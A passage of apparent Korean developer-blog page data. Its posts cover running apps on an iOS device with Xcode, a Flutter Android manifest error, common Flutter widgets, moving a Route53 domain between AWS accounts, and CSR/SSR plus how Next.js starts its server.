혹시 OS업데이트나 Xcode업데이트를 못하는 상황이 있을 수 있다.  \n이 경우 이 방법을 사용하자.\n\n먼저 [깃허브](https://github.com/filsv/iOSDeviceSupport)사이트에서 본인이 실행할 기기의 버전의 압축을 다운받자.  \n그리고 어플리케이션에서 XCode를 패키지 열기로 들어가보자.\n\n![](/img02.png)\n\n저 사진 경로에서처럼 **DeviceSupport**에 위의 압축을 푼 디렉토리를 넣어준다.  \n그리고 Xcode를 재실행하고, 설치를 시도하면 잘 될것이다.\n\n물론 프로파일도 등록을 해줘야 한다.  \n설정의 일반 -> VPN 및 기기 관리에 가면 자동으로 등록되어 있을 것이다.\n\n| ![](/img06.png) | ![](/img07.png) |\n| --------------- | --------------- |\n\n이렇게 처리하면 앱 실행이 잘 될것이다.\n\n![](/img05.png)\n\n근데 XCode에서 실행을 중지하고 다시 앱을 실행시켜 보니...\n\n![](/img09.png)\n\n아마 릴리즈로 빌드를 안해서 그런 것 같다.  \n그래도 실제 기기에서 올려서 테스트 해보니 시뮬레이터에서 보는 것 보다 나았다.\n\n이제 남은건 열심히 개발만 하면 될듯...\n\n```toc\n\n```\n"},{"excerpt":"플러터로 개발하다가... 책을 따라해보면서 하나식 복습 및 익숙해짐을 하고 있었다. 근데 이게 실제 내 기기에서 안돌려보면 제대로 되는건지 알 수가 없었다. 에뮬레이터는 한계가 있고... 그래서 iOS랑 안드로이드에 올려보려 했다. 안드로이드는 사실 다른 문제는 없었다. 그냥 비쥬얼 스튜디오에서 돌리면 되는데, 이상한 문제에 봉착했다. android:us…","fields":{"slug":"/dart_flutter/230712_android_usercleartext_error/"},"frontmatter":{"date":"July 12, 2023","title":"Flutter에서 안드로이드 기기 실행시 에러(attribute android:usesCleartextTraffic not found)","description":"attribute android:usesCleartextTraffic not found 에러 처리","tags":["Flutter","Troubleshooting"],"series":"Flutter","previewImage":"flutter_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_flutter.png)\n\n# 플러터로 개발하다가...\n\n책을 따라해보면서 하나식 복습 및 익숙해짐을 하고 있었다.  \n근데 이게 실제 내 기기에서 안돌려보면 제대로 되는건지 알 수가 없었다.\n\n에뮬레이터는 한계가 있고...  \n그래서 iOS랑 안드로이드에 올려보려 했다.  \n안드로이드는 사실 다른 문제는 없었다.\n\n그냥 비쥬얼 스튜디오에서 돌리면 되는데, 이상한 문제에 봉착했다.\n\n## android:usesCleartextTraffic not found\n\n처음 구글링 했을 때는 아 이거 그냥 쉽네~  \n라면서 **AndroidManifest.xml**만 수정하면 끝나는 줄 알았다...\n\n<br>\n\n![](/img01.png)\n\n<br>\n\n계속 에러가 발생했다.  \n추가해도 문제고...\n\n그러다가 [어떤 블로그](https://w36495.tistory.com/47)에서 원인을 찾게 되었다...\n\n에러 내용에는 분명 **userCleartextTraffic**이라 되어 있었다.  \n근데 이 속성은 **usesCleartextTraffic**이거다.\n\n```xml\n<application\n        android:label=\"book_codefactory\"\n        android:name=\"${applicationName}\"\n        android:icon=\"@mipmap/ic_launcher\"\n        android:usesCleartextTraffic=\"true\"\n        >\n```\n\n위 코드와 같이 말이다... -\\_-;;  \n**user**가 아니라 **uses**임을 잘 보라.\n\n위와 같이 수정을 하면 에러가 없어지고 잘 실행된다.  \n이거 개발자도 에러 로그를 수정 안해서 그런듯 싶다.\n\n플러터에서 발견한 첫 함정카드였다.  \n앞으론 잘 찾아봐야겠다...\n\n```toc\n\n```\n"},{"excerpt":"최근 플러터를 개발하면서... 나는 따로 강의를 수강한 적은 없고, 노마드코더쪽 무료 강의만 들었다. 먼저 따라하면서 어떤지 맛보기에는 좋았다. 하지만 실제 프로덕트(라고 하지만 개인 서비스)를 올리려 했는데 막히는 부분이 좀 있었다. 위젯을 다른 위젯으로 래핑한다거나, 공간이 벗어났을 때 처리 등등... 더 나아가선 상태관리까지... 그래서 도서관에서 …","fields":{"slug":"/dart_flutter/230709_common-widget/"},"frontmatter":{"date":"July 09, 2023","title":"Flutter에서 자주 사용하는 위젯들 (Container, Row, Colums, SafeArea, Etc)","description":"Flutter에서 많이 사용하는 위젯들","tags":["Flutter"],"series":"Flutter","previewImage":"flutter_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_flutter.png)\n\n# 최근 플러터를 개발하면서...\n\n나는 따로 강의를 수강한 적은 없고, 노마드코더쪽 무료 강의만 들었다.  \n먼저 따라하면서 어떤지 맛보기에는 좋았다.\n\n하지만 실제 프로덕트(라고 하지만 개인 서비스)를 올리려 했는데 막히는 부분이 좀 있었다.  \n위젯을 다른 위젯으로 래핑한다거나, 공간이 벗어났을 때 처리 등등...\n\n더 나아가선 상태관리까지...  \n그래서 도서관에서 책을 빌려 공부하면서 자주 쓰는 위젯에 대해 정리를 해볼까 한다.  \n여기 포스팅에 소개한 위젯 말고도 더 많겠지만, 나름 자주 쓰는 것에 대해 정리를 해본다.\n\n## Container\n\n이름과 같이 뭔가를 적재하는 위젯이다.  \n그래서 나 같은 경우 **Scaffold**위젯에서 **child**속성에 이 컨테이너 위젯을 넣는다.\n\nScaffold가 뼈대 역할을 하는데 그 시작점을 Container로 잡고 한다.  \n가로(Width)와 세로(Height)의 길이를 정할 수 있고, 컨테이너 위젯의 배경색 등을 넣을 수 있다.\n\n예를들어 가로는 화면에 꽉 채우고 세로는 300에 배경은 초록색으로 하는 박스 형태 컨테이너가 필요하면 아래와 같이 작성할 수 있다.\n\n```dart\nimport 'package:flutter/material.dart';\n\nclass HomeScreen extends StatelessWidget {\n  const HomeScreen({super.key});\n\n  @override\n  Widget build(BuildContext context) {\n    return Scaffold(\n        body: SafeArea(\n            top: true,\n            child: Container(\n              width: double.infinity,\n              height: 300,\n              decoration: const BoxDecoration(color: Colors.green),\n            )));\n  }\n}\n```\n\n그럼 아래와 같은 형태로 결과가 나올 것이다.\n\n![](/img01.png)\n\n여기서 보면 컨테이너 위에 **SafeArea**라는 위젯이 래핑되어 있는데, 이는 뒤에서 소개하겠다.\n\n그리고 컨테이너는 하나의 자식(child)를 가지는데 보통 단독으로 사용하는 위젯,  \n또는 Row, Colums와 같이 여러 자식을 소우하는 위젯을 둘 수 있다.\n\n아래는 샘플이다.\n\n```dart\n@override\n  Widget build(BuildContext context) {\n    return Scaffold(\n      body: SafeArea(\n        top: true,\n        child: Container(\n          width: double.infinity,\n          height: 300,\n          decoration: const BoxDecoration(color: Colors.green),\n          child: const Row(\n            mainAxisAlignment: MainAxisAlignment.spaceAround,\n            children: [\n              Text(\n                \"View01\",\n                style: TextStyle(\n                    color: Colors.white,\n                    fontSize: 20,\n                    fontWeight: FontWeight.w800),\n              ),\n              Text(\n                \"View02\",\n                style: TextStyle(\n                    color: Colors.white,\n                    fontSize: 20,\n                    fontWeight: FontWeight.w800),\n              ),\n              Text(\n                \"View03\",\n                style: TextStyle(\n                    color: Colors.white,\n                    fontSize: 20,\n                    fontWeight: FontWeight.w800),\n              ),\n            ],\n          ),\n        ),\n      ),\n    );\n  }\n```\n\n![](/img02.png)\n\n코드 샘플이 빈약하지만 이 정도면 컨테이너 위젯의 기본에 대해서는 알 수 있을 것이다.\n\n## Row\n\nRow위젯은 위에서 본 바와 같이 가로로 위젯을 배치하는데 사용한다.  \n그리고 다수의 위젯을 배열 형태로 받는다.  \n위의 샘플 예제에서 보면 **mainAxisAlignment**라는 속성이 있다.\n\n이건 주축 정렬에 대한 속성을 제공한다.  \n이것과 반대로 되는 것은 **crossAxisAlignment**라는 속성이 있다.\n\n말로 하니까 좀 복잡한데 다음과 같이 쉽게 정의할 수 있다.\n\n![](/img03.png)\n\n<br>\n\n### MainAxisAlignment\n\n주측 정렬(**MainAxisAlignment**)에 대한 속성은 다음과 같다.\n\n- start\n  - 시작에 정렬한다\n- center\n  - 중앙에 정렬한다.\n- end\n  - 끝에 정렬\n- SpaceBetween\n  - 각 자식 위젯간의 간격을 균등하게 정렬한다.\n- spaceAround\n  - 각 자식 위젯간의 간격을 균등하게 정렬하고, 맨처음과 맨끝 간격을 자식 위젯 사이의 반만큼 배정해 정렬한다.\n- spaceEvenly\n  - 각 자식 위젯간의 간격을 균등하게 정렬하고, 맨처음과 맨끝 간격도 균등하게 정렬한다.\n\n<br>\n\n| start           | center          | end             |\n| --------------- | --------------- | --------------- |\n| ![](/img04.png) | ![](/img05.png) | ![](/img06.png) |\n\n<br>\n\n| SpaceBetween    | spaceAround     | spaceEvenly     |\n| --------------- | --------------- | --------------- |\n| ![](/img07.png) | ![](/img08.png) | ![](/img09.png) |\n\n<br>\n\n### CrossAxisAlignment\n\n이번엔 반대측 정렬(**CrossAxisAlignment**)에 대한 속성은 다음과 같다.\n\n- start\n  - 시작에 정렬\n- center\n  - 중앙에 정렬\n- end\n  - 끝에 정렬\n- stretch\n  - 반대축 최대한으로 늘려서 정렬\n\n<br>\n\n| start           | center          |\n| --------------- | --------------- |\n| ![](/img10.png) | ![](/img11.png) |\n\n<br>\n\n| end             | stretch         |\n| --------------- | --------------- |\n| ![](/img12.png) | ![](/img13.png) |\n\n## Colum\n\n컬럼은 Row랑 반대 성향의 위젯이다.  \n**Colum**은 세로로 위젯을 배치하는데 사용한다.  \n그리고 다수의 위젯을 배열 형태로 받는다.\n\n샘플 코드는 아래와 같다.\n\n```dart\n@override\n  Widget build(BuildContext context) {\n    return Scaffold(\n      body: SafeArea(\n        top: true,\n        child: Container(\n          width: double.infinity,\n          height: 300,\n          decoration: const BoxDecoration(color: Colors.green),\n          child: Column(\n            children: [\n              Container(\n                width: 100,\n                height: 100,\n                decoration: const BoxDecoration(color: Colors.blue),\n                child: const Center(\n                  child: Text(\n                    \"View01\",\n                    style: TextStyle(\n                        color: Colors.white,\n                        fontSize: 20,\n                        fontWeight: FontWeight.w800),\n                  ),\n                ),\n              ),\n              Container(\n                width: 100,\n                height: 100,\n                decoration: const BoxDecoration(color: Colors.indigo),\n                child: const Center(\n                  child: Text(\n                    \"View02\",\n                    style: TextStyle(\n                        color: Colors.white,\n                        fontSize: 20,\n                        fontWeight: FontWeight.w800),\n                  ),\n                ),\n              ),\n              Container(\n                width: 100,\n                height: 100,\n                decoration: const BoxDecoration(color: Colors.blueGrey),\n                child: const Center(\n                  child: Text(\n                    \"View03\",\n                    style: TextStyle(\n                        color: Colors.white,\n                        fontSize: 20,\n                        fontWeight: FontWeight.w800),\n                  ),\n                ),\n              ),\n            ],\n          ),\n        ),\n      ),\n    );\n  }\n```\n\n<br>\n\n중요한 것은 여기도 주축정렬과 반대정렬이 있는데, Row와 반대 성향을 가진다.\n\n<br>\n\n![](/img14.png)\n\n<br>\n\n주측 정렬(**MainAxisAlignment**)에 대한 속성은 다음과 같다.\n\n- start\n  - 시작에 정렬한다\n- center\n  - 중앙에 정렬한다.\n- end\n  - 끝에 정렬\n- SpaceBetween\n  - 각 자식 위젯간의 간격을 균등하게 정렬한다.\n- spaceAround\n  - 각 자식 위젯간의 간격을 균등하게 정렬하고, 맨처음과 맨끝 간격을 자식 위젯 사이의 반만큼 배정해 정렬한다.\n- spaceEvenly\n  - 각 자식 위젯간의 간격을 균등하게 정렬하고, 맨처음과 맨끝 간격도 균등하게 정렬한다.\n\n<br>\n\n| start           | center          | end             |\n| --------------- | --------------- | --------------- |\n| ![](/img15.png) | ![](/img16.png) | ![](/img17.png) |\n\n<br>\n\n| SpaceBetween    | spaceAround     | spaceEvenly     |\n| --------------- | --------------- | --------------- |\n| ![](/img18.png) | ![](/img19.png) | ![](/img20.png) |\n\n<br>\n\n### CrossAxisAlignment\n\n이번엔 반대측 정렬(**CrossAxisAlignment**)에 대한 속성은 다음과 같다.\n\n- start\n  - 시작에 정렬\n- center\n  - 중앙에 정렬\n- end\n  - 끝에 정렬\n- stretch\n  - 반대축 최대한으로 늘려서 정렬\n\n<br>\n\n| start           | center          |\n| --------------- | --------------- |\n| ![](/img21.png) | ![](/img22.png) |\n\n<br>\n\n| end             | stretch         |\n| --------------- | --------------- |\n| ![](/img23.png) | ![](/img24.png) |\n\n## SafeArea\n\n이름에서처럼 안전한 영역을 제공해주는 위젯이다.  \n이게 뭔말이냐 하면...\n\n아이폰의 경우 하드웨어 특성상 노치가 있다.  \n그래서 아래와 같은 코드가 있다고 해보자.\n\n```dart\n@override\n  Widget build(BuildContext context) {\n    return Scaffold(\n      body: Container(\n        width: double.infinity,\n        height: 300,\n        decoration: const BoxDecoration(color: Colors.green),\n      ),\n    );\n  }\n```\n\n이 코드의 결과는 아래와 같이 출력된다.\n\n![](/img25.png)\n\n근데 저 **SafeArea**위젯을 사용하면 아래와 같이 노치를 벗어나서 랜더링 된다.\n\n![](/img26.png)\n\n코드는 다음과 같다.\n\n```dart\n  @override\n  Widget build(BuildContext context) {\n    return Scaffold(\n      body: SafeArea(\n        top: true,\n        child: Container(\n          width: double.infinity,\n          height: 300,\n          decoration: const BoxDecoration(color: Colors.green),\n        ),\n      ),\n    );\n  }\n```\n\n속성에는 top, bottom, left, rigth가 있고 bool 값을 받는데, 기본으로 전부 true를 가진다.  \n물론 미적용하고 싶다면 각 속성에 false를 걸어주면 된다.\n\n## SizedBox\n\n## Flexible\n\n## Expanded\n\n<br>\n\n```toc\n\n```\n"},{"excerpt":"무료 계정으로 연명하다가... 예전에 만들고 언젠간(?) 유지보수를 하려 했던 MyMeLink의 Aws 무료 플랜이 끝났다. 정확히 이야기하면 6월에 끝난다. 근데 서비스가 잘 큰것도 아니고, 거의 나만 쓰며, 유지보수를 현재 못하고 있는 상황에... 여기에 돈내고 서비스 연명하기엔 투자비가 아까웠다. (그래봤자 얼마 안되겠지만...) 뭐 사용자가 있다면…","fields":{"slug":"/aws/230629_change-aws-domain/"},"frontmatter":{"date":"June 29, 2023","title":"AWS Route53에서 구입한 도메인 다른 계정으로 이동하기","description":"Aws 계정 간에 도메인 양도양수하기","tags":["Aws","Route53","Infra"],"series":"Aws","previewImage":"aws_logo.webp","isPrivate":null},"rawMarkdownBody":"\n# 무료 계정으로 연명하다가...\n\n예전에 만들고 언젠간(?) 유지보수를 하려 했던 [MyMeLink](https://myme.link)의 Aws 무료 플랜이 끝났다.  \n정확히 이야기하면 6월에 끝난다.\n\n근데 서비스가 잘 큰것도 아니고, 거의 나만 쓰며, 유지보수를 현재 못하고 있는 상황에...  \n여기에 돈내고 서비스 연명하기엔 투자비가 아까웠다.  \n(그래봤자 얼마 안되겠지만...)\n\n뭐 사용자가 있다면 계속 서비스를 살리겠지만...  \n최근 [흑우집합소](https://bcow.world)랑 모바일에 유지보수 리팩토링까지 하니 시간이 없다 -\\_-;;\n\n무튼 그래서 Aws에서 도메인을 바꾸던가 다시 사서 해보려 했는데,  \n이미 6월달 중순쯔음 도메인 연장 결제가 되었다 -\\_-;;;\n\n그래서 몇 가지 찾아보니 Aws에서 도메인 이동이 된다하여 진행해보기로 했다.\n\n먼저 내가 진행하는 조건은 다음과 같다.\n\n1. Aws Route53에서 구입한 도메인이다.\n2. 전달받을 Aws 신규 계정이 있다.\n3. 도메인 구입을 한 AWS 계정에 접근이 가능하다.\n\n2번이랑 3번은 당연한 이야기고...  \n1번의 경우 타 회사(가비아, 기타..)에서 옮기려 하는 분들도 있을텐데,  \n이 부분은 내가 안해봐서 잘 모르겠다.\n\n일단 이번 포스팅의 목표는  \n**AWS Route53에서 구입한 도메인을 타 계정으로 양도**가 목표다.  \n그럼 아래 순서대로 포스팅를 진행해보겠다.  \n양도하시려는 분들은 아래부터 하나씩 따라가 보면 된다.\n\n## 1. AWS 도메인 양도자 진행 부분\n\n진행하기 전에 먼저 양수자(도메인을 받을 계정)의 계정 ID를 알아야 한다.\n\n<br>\n\n![](/img02.png)\n\n저기 사진과 같이 AWS 콘솔에서 우측 상단에 계정명을 선택하면 하단에 계정 ID가 있다.  \n여기서 하이픈(-)을 제외한 숫자가 계정 ID다.\n\n양도자 계정에서 **Route53**으로 이동한다.  \n거기서 **등록된 도메인**항목에서 양도할 도메인을 선택한다.\n\n<br>\n\n![](/img01.png)\n\n위 사진과 같이 **송신**이란 버튼을 누르면 **다른 AWS 계정으로 이전**이라는 항목을 선택한다.\n그럼 아래 사진과 같이 양수자의 계정 Id를 입력받는 곳이 있는데 적어준다.\n\n<br>\n\n![](/img03.png)\n\n확인을 누르면 암호가 나오는데 이를 메모장이나 어딘가에 잘 기억 또는 저장해두자.\n\n## 2. AWS 도메인 양수자 진행 부분\n\n이제 양수자 계정에서 **Route53 => 도메인 => 요청**항목에 가면,  \n아래 사진과 같이 도메인 양도 요청이 온 것을 확인할 수 있다.\n\n<br>\n\n![](/img04.png)\n\n<br>\n\n라디오 버튼을 클릭해서 선택하고 상단에 작업 버튼을 누르고 수락을 선택한다.\n\n<br>\n\n![](/img05.png)\n\n<br>\n\n그러면 도메인을 이전하는 화면이 뜨는데 다른거 건들지말고,  \n아까 양도자 작업시 받은 암호를 적어둔다.  \n물론 약관 체크는 해줘야 한다.\n\n<br>\n\n![](/img06.png)\n\n<br>\n\n이렇게 하면 아래와 같이 도메인 양도 작업이 완료된다.\n\n<br>\n\n![](/img07.png)\n\n## 3. 호스팅 영역 및 도메인 이름 서버 변경\n\n이제 양수자 계정에서 몇 가지 작업만 해주면 된다.  \n먼저 호스팅 영역이 생성 안되어 있을텐데 기존 양도 계정과 맞춰서 호스팅 영역을 생성해준다.\n\n호스팅 영역이 생성되면 아래 사진과 같이 이름 서버(네임서버)가 있을텐데 이를 복사해준다.\n\n<br>\n\n![](/img08.png)\n\n<br>\n\n이후 **도메인 => 등록된 도메인**항목으로 이동한다.  \n그리고 양도받은 도메인을 선택하고 상단의 작업 버튼을 선택해서 **이름 서버 편집**메뉴를 선택한다.\n\n<br>\n\n![](/img09.png)\n\n<br>\n\n아래와 같이 하나 창이 뜨는데 아까 호스팅 영역에서 가져온 이름 서버 주소를 하나씩 입력해준다.\n\n<br>\n\n![](/img10.png)\n\n<br>\n\n이렇게 하고 저장하면 아래처럼 24시간 내에 전파된다고 뜬다.\n\n<br>\n\n![](/img11.png)\n\n<br>\n\n근데 나는 바로 되었다 -\\_-;;  \n이후 조금만 기다리거나, 적용이 다 되면 메일이 한통 온다.\n\n<br>\n\n![](/img12.png)\n\n<br>\n\n이렇게 확인 메일까지 끝나면 양도 작업은 완료된 것이다.\n\n## 정리\n\n작업 자제는 심플한데 나는 이름 서버를 변경 안해서 전파 시간이 오래 걸리나 하며 하루를 넘겼다. -\\_-;;  \n그래도 잘 처리되었고, 이렇게 정리하니 어려운 작업은 아닌 것 같다.\n\n몇 블로그를 좀 찾아봤는데...  \n이걸 CLI로도 할 수 있긴 했다.  \n근데 굳이?\n\n사용하기 편리한 GUI를 두고?  \n물론 이걸 자동화 해서 무료 버전으로 철새마냥 점프 하는 이상한 사람을 위한 옵션이겠지만...\n\n그냥 별 이유 없으면 GUI 쓰자.  \n쉽게 쉽게 가는게 좋지 굳이 어려운 이상한 권한 주고 이상한 화면 볼 필요는 없는것 같다.\n\n<br>\n\n### 참고링크\n\n[(공식)도메인을 다른 AWS 계정으로 이전하기](https://docs.aws.amazon.com/ko_kr/Route53/latest/DeveloperGuide/domain-transfer-between-aws-accounts.html)\n\n```toc\n\n```\n"},{"excerpt":"이번 포스팅은... 저번 프리온보딩은 제대로 참여를 못했다. 주말이 껴 있는 부분도 있었고, 개인적인 사유로 좀 많이 바빴다. 이번 7월 챌린지는 예전에 1월인가 프리온보딩을 진행했던 강사님이 다시 진행하신다고 하셨다. 디스코드를 안나가고 있었는데 다행이었다(?) 사전과제가 있었는데 이를 정리해서 개인 블로그에 포스팅하고 링크 제출이 있었다. 매번 이론은…","fields":{"slug":"/til/230620_wanted_challenge_qna/"},"frontmatter":{"date":"June 27, 2023","title":"23년 7월 원티드 프리온보딩 프론트엔드 챌린지 사전과제","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](/thumbnail.png)\n\n# 이번 포스팅은...\n\n저번 프리온보딩은 제대로 참여를 못했다.  \n주말이 껴 있는 부분도 있었고, 개인적인 사유로 좀 많이 바빴다.\n\n이번 7월 챌린지는 예전에 1월인가 프리온보딩을 진행했던 강사님이 다시 진행하신다고 하셨다.  \n디스코드를 안나가고 있었는데 다행이었다(?)\n\n**사전과제가 있었는데 이를 정리해서 개인 블로그에 포스팅하고 링크 제출이 있었다.**  \n매번 이론은 잘 안보고 기능 구현만 했는데...  \n이번에 사전 과제를 하면서 한번 정리를 해봐야겠다.\n\n근데 어렵게 설명하는건 좋아하지 않아서 나름 쉽게 풀고 예시를 들어 설명할 예정이다.\n\n## 1. CSR(Client-side Rendering)이란 무엇이며, 그것의 장단점에 대하여 설명해주세요.\n\n### CSR(Client-side Rendering)이란 무엇인가?\n\n영어에서 표현한바와 같이 **랜더링 작업을 클라이언트(브라우저단)에서 해주는 것**을 의미한다.  \n다른 블로그나 문서를 보면 뭔가 어렵고 복잡하게 설명을 하는데 난 이 부분을 쉽게 설명해보겠다.\n\n웹 브라우저에서 뭔가를 보여주려면 세 가지 요소가 필요하다.\n\n페이지를 구성하는 **HTML**,  \n페이지를 이쁘게 꾸미기 위한 **CSS**,  \n그리고 사용자와 상호 작용을 위한 **JS**\n\n이렇게 세 가지 요소가 필요하다.  \n이게 있어야 웹 브라우저에서 뭔가를 표현하거나, 사용자와 상호 작용을 할 수 있다.\n\n일단 웹 페이지는 저 세 가지 요소가 삼위일체(트포?) 마냥 잘 조합되어야 사용자가 비로소 사용할 수 있게 된다.  \n조합을 해주는 주체가 서버이면 **SSR**이고, 클라이언트(사용자측)이라면 **CSR**이다.\n\n**CSR**은 저 요소들 중 **HTML**은 최소한의 태그만 포함한 가벼운 형태(body가 비어있는)로 서버에게 받아온다.  \n그리고 **JS**를 받아오고, 그 JS를 가지고 리엑트나 뷰를 통해서 HTML을 랜더링 해준다.\n\n게임으로 설명해보면...  \n스타크래프트의 저그 드론이라 생각하면 된다.\n\n![thumbnail](/img02.png)\n\n이 드론은 스토리상 저그 건물의 유전정보를 모두 가지고 있다고 한다.  \n그래서 오버로드의 명령에 따라 필요한 건물로 변태를 한다.\n\nCSR도 얘랑 비슷하다.  \n맨 처음 서버에서 저 드론을 하나 받았다고 생각해보자.  \n그럼 저 드론은 아래와 같이 다양한 형태로 변태가 가능하다.\n\n![thumbnail](/img01.jpeg)\n\n그렇다...  \n서버로부터 드론(**HTML**과 **JS**를 내포(內包)한 것)을 내려받고,  \n드론은 내포된 **JS**를 통해 **HTML**을 랜더링한다.\n\n이 정도 설명하면 **CSR**는 이해가 되었을 것이다.\n\n번외로...  \n**SSR(Server-Side Rendering)**은 프로토스의 프로브가 소환하는 건물이라 보면 된다.\n\n스토리상...  \n프로토스 건물은 아이어에서 이미 완성된 건물을 포탈을 통해 이동시키는거다.\n\n즉 프로브(클라이언트)가 서버측(아이어)에게 요청을 하면,  \n서버측에서 랜더링을 다한 **HTML**과 **JS**를 클라이언트에게 주는 것이다.\n\n급조한 거라서 설명이 뭔가 매끄럽지 못한데 -\\_-;;  \n대충 이 정도면 감을 잡았으리라 생각한다.\n\n<br>\n\n### CSR(Client-side Rendering)의 장단점\n\nCRS의 장단점은 아래와 같다.\n\n#### 장점\n\n1. 다른 페이지로 이동하거나 추가 페이지 로드 시간이 빠르다.\n   - 이미 서버로부터 모든 자원(JS,CSS)을 내려받았기 때문에 추가적인 자원을 로드하는데 시간이 필요하지 않다.\n2. UI를 전체적으로 다시 로드할 필요가 없다.\n   - 변경되는 부분만 업데이트가 가능하다.\n\n#### 단점\n\n1. HTML 파일만 받고, 클라이언트에서 랜더링을 하기에 SEO(search engine optimization)에 불리하다.\n   - 크롤링 봇은 HTML 파일을 보고 판단하는데 내용이 비어있다.\n2. 첫 로드 시 모든 로직을 담은 파일(JS)를 받기에 첫 진입 속도가 느리다.\n   - 이와 연계되는게 클라이언트의 하드웨어 및 소프트웨어에 의존도가 높아져서, 사용자마다 페이지 로드 시간이 다를 수 있다.\n3. JS가 동작하지 않는 브라우저 환경에서의 문제\n   - 물론 JS가 돌아가지 않는 브라우저가 어디있겠냐지만, 보안이나 어떤 문제로 인해 동작할 수 없는 환경이 있을 수 있다.\n\n<br>\n\n## 2. SPA(Single Page Application)로 구성된 웹 앱에서 SSR(Server-side Rendering)이 필요한 이유에 대하여 설명해주세요.\n\nSPA는 가만 보기에 CRS와 유사하다.  \n어찌보면 SPA의 구현 방식중 CRS나 SSR이 있다고 생각하면 편하다.\n\n근데 SPA에서 SSR이 필요한 이유는 CRS의 단점을 극복하기 위함이라 보면 된다.  \n자주 언급되는 SEO의 경우 CRS에서 극복이 어느정도 가능하지만, 손쉽게 처리하기 어렵다.\n\n브라우저의 호환성도 이슈가 될 수 있다.  \nSPA의 경우 클라이언트의 브라우저에 100% 의존하기에 몇몇 자바스크립트 문법의 경우 브라우저마다 다르게 동작한다.  \nSSR을 사용할 경우 서버에서 초기 페이지에 대해 렌더링을 해주기에 이 문제를 어느정도 완화시킬 수 있다.\n\n마지막으로 보안 문제가 있을 수 있다.  \n클라이언트에서 서버에게 Ajax나 Axios 등 요청으로 권한 검사를 해줄 수 있다.  \n하지만 권한이 있는 사용자만 접근해야 하는 페이지가 있거나, 권한이 있어야 볼 수 있는 항목을 처리해야 할 경우 문제가 생길 수 있다.  \n보안 처리를 클라이언트에게 맡기는 경우 상당한 리스크가 생긴다.\n\nSSR을 사용할 경우 서버 측에서 초기 렌더링 시 보안 로직을 수행하여 결과를 다르게 줄 수 있는 장점이 있다.\n\n<br>\n\n## 3. Next.js 프로젝트에서 yarn start(or npm run start) 스크립트를 실행했을 때 실행되는 코드를 Next.js Github 레포지토리에서 찾은 뒤, 해당 파일에 대한 간단한 설명을 첨부해주세요.\n\n먼저 이 질문을 이해하기 앞서, Next.JS가 아닌 npm이나 Node의 진입점이 궁금했다.  \n정확히 이야기하면, **yarn start(or npm run start)**이 명령어를 줬을 때 실행하는 최초 시작점이랄까?\n\nSpring의 경우 Main함수가 있다.\n\n```java\n@Slf4j\n@SpringBootApplication\n@EnableAspectJAutoProxy\n@EnableScheduling\n@ServletComponentScan\npublic class OnlydreamApplication implements CommandLineRunner, ApplicationRunner {\n\n\tpublic static void main(String[] args) {\n\t\tApiContextInitializer.init();\n\t\tSpringApplication.run(OnlydreamApplication.class, args);\n\t}\n\n\n\t@Override\n\tpublic void run(String... args) throws Exception {\n\n\t}\n\n\t@Override\n\tpublic void run(ApplicationArguments args) throws Exception {\n\n\t}\n}\n```\n\n옛날에 스프링으로 개발했던 흑우집합소 코드인데... 아련하다 ㅎㅎ  \n무튼 이런 시작점이 어딘지 잘 몰랐다.\n\n**Nest.Js**의 경우에는 **main.ts**등으로 아래와 같이 **bootstrap**함수를 호출하는 것으로 시작한다.\n\n```typescript\nasync function bootstrap() {\n   const app = await NestFactory.create(AppModule, {... });\n   await app.listen(9911, \"0.0.0.0\");\n}\n\nbootstrap();\n```\n\n하지만 **Next.Js**의 경우 이 명령어를 줬을 때 실행하는 **Main함수(또는 메서드)**를 찾을 수 없었다.\n\n구글링 한 결과...  \n**node_modules/next/dist/cli/next-start.js** 저 파일을 확인해보라 했다.\n\n이제부터 긴 설명에 앞서...\n\n만약 본인의 컴퓨터에 있는 Next.Js 프로젝트가 아닌 깃허브에서 보고 싶다면,  \nGithub의 [next.js/packages/next/src](https://github.com/vercel/next.js/tree/canary/packages/next/src)를 참고하며 보도록 하자.  \n결국 개인 프로젝트 폴더의 node_modules/next/dist/ 와 next.js/packages/next/src 는 같은 결과물을 바라본다.  \n물론 버전에 따라 틀릴 수 있겠지만...\n\n그리고 정답을 먼저 공개하자면...  \n[base-server.ts](https://github.com/vercel/next.js/blob/canary/packages/next/src/server/base-server.ts)가 모든 것을 쥐고 있다. (로컬일 경우 base-server.js)  \n이 부분은 아래 설명을 추적하다보면 이해가 될 것이다.\n\n그럼 위에 나온대로 **next-start.js**파일부터 하나씩 내려가보자.\n\n```javascript\n//node_modules/next/dist/cli/next-start.js\n\n#!/usr/bin/env node\n'use strict'\nObject.defineProperty(exports, '__esModule', {\n  value: true,\n})\nexports.nextStart = void 0\nvar _indexJs = _interopRequireDefault(\n  require('next/dist/compiled/arg/index.js')\n)\nvar _startServer = require('../server/lib/start-server')\nvar _utils = require('../server/lib/utils')\nvar Log = _interopRequireWildcard(require('../build/output/log'))\nvar _isError = _interopRequireDefault(require('../lib/is-error'))\nvar _getProjectDir = require('../lib/get-project-dir')\nfunction _interopRequireDefault(obj) {\n  return obj && obj.__esModule\n    ? obj\n    : {\n        default: obj,\n      }\n}\n//기타 엄청난 코드들...\n```\n\n<br>\n\n잠깐 열었다가 닫고 싶어진 코드였다 -\\_-;;  \n그래도 학습을 위해선 봐야지...  \n조금 스크롤을 내리면 **const nextStart = (argv)=>{}** 익명함수가 보인다.\n\n```javascript\n//node_modules/next/dist/cli/next-start.js\n\nconst nextStart = argv => {\n  const validArgs = {\n    // Types\n    \"--help\": Boolean,\n    \"--port\": Number,\n    \"--hostname\": String,\n    \"--keepAliveTimeout\": Number,\n    // Aliases\n    \"-h\": \"--help\",\n    \"-p\": \"--port\",\n    \"-H\": \"--hostname\",\n  }\n}\n//...\n;(0, _startServer)\n  .startServer({\n    dir,\n    hostname: host,\n    port,\n    keepAliveTimeout,\n  })\n  .then(async app => {\n    const appUrl = `http://${app.hostname}:${app.port}`\n    Log.ready(`started server on ${host}:${app.port}, url: ${appUrl}`)\n    await app.prepare()\n  })\n  .catch(err => {\n    console.error(err)\n    process.exit(1)\n  })\n```\n\n<br>\n\nCli 전달인자들에 대한 것들이 있고 마지막 쯔음 **startServer**서버를 실행하는 함수를 전달받는 함수가 있다.  \n**(0, \\_startServer).**이 형태는 처음 보는 형태였다.\n\n저게 어떻게 함수를 호출하는지...  \n기본기가 